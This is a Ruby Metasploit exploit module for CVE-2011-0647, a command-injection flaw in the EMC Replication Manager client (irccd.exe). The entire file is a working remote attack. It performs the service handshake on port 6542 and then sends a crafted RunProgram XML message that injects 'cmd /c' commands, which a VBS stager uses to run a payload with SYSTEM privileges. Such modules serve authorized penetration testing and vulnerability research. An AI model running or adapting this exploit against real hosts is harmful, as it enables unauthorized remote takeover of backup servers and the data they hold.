##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC Replication Manager Command Execution',
      'Description'    => %q{
        This module exploits a remote command-injection vulnerability in EMC Replication Manager
        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an
        attacker may be able to execute arbitrary commands with SYSTEM privileges. Affected
        products are EMC Replication Manager < 5.3. This module has been successfully tested
        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft
        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested
        against these products.
      },
      'Author'         =>
        [
          'Unknown', #Initial discovery
          'Davy Douhine' #MSF module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-0647' ],
          [ 'OSVDB', '70853' ],
          [ 'BID', '46235' ],
          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],
          [ 'ZDI', '11-061' ]
        ],
      'DisclosureDate' => 'Feb 07 2011',
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'Targets'        =>
        [
          # Tested on Windows XP and Windows 2003
          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]
        ],
      'CmdStagerFlavor' => 'vbs',
      'DefaultOptions' =>
        {
          'WfsDelay' => 5
        },
      'DefaultTarget'  => 0,
      'Privileged'     => true
      ))

    register_options(
      [
        Opt::RPORT(6542)
      ], self.class)
  end

  def exploit
    execute_cmdstager({:linemax => 5000})
  end

  def execute_command(cmd, opts)
    connect
    hello = "1HELLOEMC00000000000000000000000"
    vprint_status("Sending hello...")
    sock.put(hello)
    result = sock.get_once || ''
    if result =~ /RAWHELLO/
      vprint_good("Expected hello response")
    else
      disconnect
      fail_with(Failure::Unknown ,"Failed to hello the server")
    end

    start_session = "EMC_Len0000000136<?xml version=\"1.0\" encoding=\"UTF-8\"?><ir_message ir_sessionId=0000 ir_type=\"ClientStartSession\" <ir_version>1</ir_version></ir_message>"
    vprint_status("Starting session...")
    sock.put(start_session)
    result = sock.get_once || ''
    if result =~ /EMC/
      vprint_good("A session has been created. Good.")
    else
      disconnect
      fail_with(Failure::Unknown, "Failed to create the session")
    end

    run_prog = "<?xml version=\"1.0\" encoding=\"UTF-8\"?> "
    run_prog << "<ir_message ir_sessionId=\"01111\" ir_requestId=\"00000\" ir_type=\"RunProgram\" ir_status=\"0\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>"
    run_prog << "<ir_runProgramAppInfo>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;ir_message ir_sessionId=&quot;00000&quot; ir_requestId=&quot;00000&quot; "
    run_prog << "ir_type=&quot;App Info&quot; ir_status=&quot;0&quot;&gt;&lt;IR_groupEntry IR_groupType=&quot;anywriter&quot;  IR_groupName=&quot;CM1109A1&quot;  IR_groupId=&quot;1&quot; "
    run_prog << "&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;? &amp;gt; &amp;lt;ir_message ir_sessionId=&amp;quot;00000&amp;quot; "
    run_prog << "ir_requestId=&amp;quot;00000&amp;quot;ir_type=&amp;quot;App Info&amp;quot; ir_status=&amp;quot;0&amp;quot;&amp;gt;&amp;lt;aa_anywriter_ccr_node&amp;gt;CM1109A1"
    run_prog << "&amp;lt;/aa_anywriter_ccr_node&amp;gt;&amp;lt;aa_anywriter_fail_1018&amp;gt;0&amp;lt;/aa_anywriter_fail_1018&amp;gt;&amp;lt;aa_anywriter_fail_1019&amp;gt;0"
    run_prog << "&amp;lt;/aa_anywriter_fail_1019&amp;gt;&amp;lt;aa_anywriter_fail_1022&amp;gt;0&amp;lt;/aa_anywriter_fail_1022&amp;gt;&amp;lt;aa_anywriter_runeseutil&amp;gt;1"
    run_prog << "&amp;lt;/aa_anywriter_runeseutil&amp;gt;&amp;lt;aa_anywriter_ccr_role&amp;gt;2&amp;lt;/aa_anywriter_ccr_role&amp;gt;&amp;lt;aa_anywriter_prescript&amp;gt;"
    run_prog << "&amp;lt;/aa_anywriter_prescript&amp;gt;&amp;lt;aa_anywriter_postscript&amp;gt;&amp;lt;/aa_anywriter_postscript&amp;gt;&amp;lt;aa_anywriter_backuptype&amp;gt;1"
    run_prog << "&amp;lt;/aa_anywriter_backuptype&amp;gt;&amp;lt;aa_anywriter_fail_447&amp;gt;0&amp;lt;/aa_anywriter_fail_447&amp;gt;&amp;lt;aa_anywriter_fail_448&amp;gt;0"
    run_prog << "&amp;lt;/aa_anywriter_fail_448&amp;gt;&amp;lt;aa_exchange_ignore_all&amp;gt;0&amp;lt;/aa_exchange_ignore_all&amp;gt;&amp;lt;aa_anywriter_sthread_eseutil&amp;gt;0&amp"
    run_prog << ";lt;/aa_anywriter_sthread_eseutil&amp;gt;&amp;lt;aa_anywriter_required_logs&amp;gt;0&amp;lt;/aa_anywriter_required_logs&amp;gt;&amp;lt;aa_anywriter_required_logs_path"
    run_prog << "&amp;gt;&amp;lt;/aa_anywriter_required_logs_path&amp;gt;&amp;lt;aa_anywriter_throttle&amp;gt;1&amp;lt;/aa_anywriter_throttle&amp;gt;&amp;lt;aa_anywriter_throttle_ios&amp;gt;300"
    run_prog << "&amp;lt;/aa_anywriter_throttle_ios&amp;gt;&amp;lt;aa_anywriter_throttle_dur&amp;gt;1000&amp;lt;/aa_anywriter_throttle_dur&amp;gt;&amp;lt;aa_backup_username&amp;gt;"
    run_prog << "&amp;lt;/aa_backup_username&amp;gt;&amp;lt;aa_backup_password&amp;gt;&amp;lt;/aa_backup_password&amp;gt;&amp;lt;aa_exchange_checksince&amp;gt;1335208339"
    run_prog << "&amp;lt;/aa_exchange_checksince&amp;gt; &amp;lt;/ir_message&amp;gt;&lt;/IR_groupEntry&gt; &lt;/ir_message&gt;</ir_runProgramAppInfo>"
    run_prog << "<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>"
    run_prog_header = "EMC_Len000000"
    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog

    vprint_status("Executing command....")
    sock.put(run_prog_packet)
    sock.get_once(-1, 1)

    end_string = Rex::Text.rand_text_alpha(rand(10)+32)
    sock.put(end_string)
    sock.get_once(-1, 1)
    disconnect

  end
end